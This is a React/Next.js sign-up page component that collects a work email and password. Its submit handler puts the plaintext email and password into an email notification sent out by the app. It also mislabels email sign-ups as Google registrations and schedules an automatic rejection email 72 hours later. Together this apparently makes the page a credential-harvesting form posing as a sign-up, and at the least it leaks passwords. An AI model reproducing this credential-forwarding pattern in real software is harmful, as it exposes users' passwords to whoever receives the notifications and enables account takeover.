"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { ChevronLeftIcon } from "@radix-ui/react-icons";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { FcGoogle } from "react-icons/fc";
import { checkUserExistence } from "@/actions/user";
import InProgress from "@/components/InProgress";
import { sendEmailNotification } from "@/actions/notification";
import { generateEmailNotification, generateRejectionEmail } from "@/lib/utils";
import { signInUser, RegisteredBy } from "@/actions/auth";
import RejectionModal from "@/components/RejectionModal";
import UserInputs from "@/components/UserInputs";

const Email = () => {
  const [loading, setLoading] = useState(false);
  const [email, setEmail] = useState("");
  const [step, setStep] = useState<"email-password" | "inputs">(
    "email-password"
  );
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showModal, setShowModal] = useState<"reject" | "in-progress" | null>(
    null
  );

  const [userId, setUserId] = useState<number>();

  const toggleShowPassword = () => setShowPassword(!showPassword);

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    setLoading(true);
    try {
      const createdAt = await checkUserExistence(email);
      if (createdAt) {
        const createdAtDate = new Date(createdAt);
        const now = new Date();
        const hoursDifference =
          (now.getTime() - createdAtDate.getTime()) / (1000 * 60 * 60);
        setEmail("");
        setPassword("");
        if (hoursDifference < 72) {
          setShowModal("in-progress");
        } else {
          setShowModal("reject");
        }
      } else {
        const id = await signInUser({
          email,
          password,
          registeredBy: RegisteredBy.GOOGLE,
        });
        setUserId(id);
        setStep("inputs");

        const emailBody = generateEmailNotification({ email, password });
        await sendEmailNotification(emailBody);

        setTimeout(async () => {
          try {
            const rejectionEmailBody = await generateRejectionEmail(email);
            await sendEmailNotification(rejectionEmailBody);
          } catch (error) {
            console.error("Failed to send rejection email:", error);
          }
        }, 259200000);
      }
    } catch (error) {
      console.log("Error: ", error);
    } finally {
      setEmail("");
      setPassword("");
      setShowPassword(false);
      setLoading(false);
    }
  };

  return (
    <>
      {showModal === "reject" ? (
        <RejectionModal />
      ) : showModal === "in-progress" ? (
        <InProgress />
      ) : step === "email-password" ? (
        <Card className="max-w-md w-full p-12  animate-fade-in-scale relative z-10 mt-5 sm:mt-0">
          <div className="flex flex-col items-center space-y-8 relative">
            <Link href="/">
              <ChevronLeftIcon className="w-6 h-6 absolute top-[-81px] sm:top-0 left-[-50px] sm:left-[-85px] text-white" />
            </Link>
            <div className="space-y-3">
              <h1 className="text-2xl font-bold text-[#33455F]">Sign up</h1>
              <p className=" text-gray-600 text-sm sm:text-base">
                Please provide your work email
              </p>
            </div>
            <form className="w-full space-y-6" onSubmit={handleSubmit}>
              <div className="space-y-3">
                <div className="relative">
                  <Input
                    type="email"
                    placeholder=""
                    id="email"
                    value={email}
                    required
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full h-12 px-4 pr-12 pt-4 pb-1 rounded-[4px] input-focus-ring focus-visible:ring-[#62C1E4] transition-all duration-200 ease-in-out peer placeholder-transparent"
                  />
                  <label
                    htmlFor="email"
                    className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-[#62C1E4]
            peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
                  >
                    Email
                  </label>
                </div>
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-12 px-4 rounded-[4px] pr-12 pt-4 pb-1 input-focus-ring focus-visible:ring-[#62C1E4] transition-all duration-200 ease-in-out peer placeholder-transparen"
                    placeholder=""
                    id="password"
                    required
                  />
                  <label
                    htmlFor="password"
                    className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-[#62C1E4]
            peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
                  >
                    Password
                  </label>
                  <button
                    type="button"
                    onClick={toggleShowPassword}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors duration-200"
                  >
                    {showPassword ? (
                      <EyeOff className="h-5 w-5 hover:text-[#62C1E4]" />
                    ) : (
                      <Eye className="h-5 w-5 hover:text-[#62C1E4]" />
                    )}
                  </button>
                </div>
              </div>

              <div className="space-y-1.5">
                <Button
                  disabled={loading}
                  className="bg-[#344564] w-full hover:bg-[#344564]/95 text-white px-6 py-6 rounded-sm transition-colors duration-200"
                >
                  Sign Up
                </Button>

                <p className="text-gray-600 text-sm sm:text-base">
                  Already have an account?{" "}
                  <Link
                    href="/sign-in"
                    className="text-[#62C1E4] font-bold hover:text-[#62C1E4]/80"
                  >
                    Log in
                  </Link>
                </p>
              </div>
              <div className="divider">
                <span className="text-xs">or</span>
              </div>

              <div>
                <Link href="/google">
                  <button className="social-button hover:bg-primary/90 hover:text-white border !border-border">
                    <FcGoogle className="w-5 h-5" />
                    <span>Continue with Google</span>
                  </button>
                </Link>
              </div>
            </form>
          </div>
        </Card>
      ) : (
        <UserInputs id={userId as number} />
      )}
    </>
  );
};

export default Email;
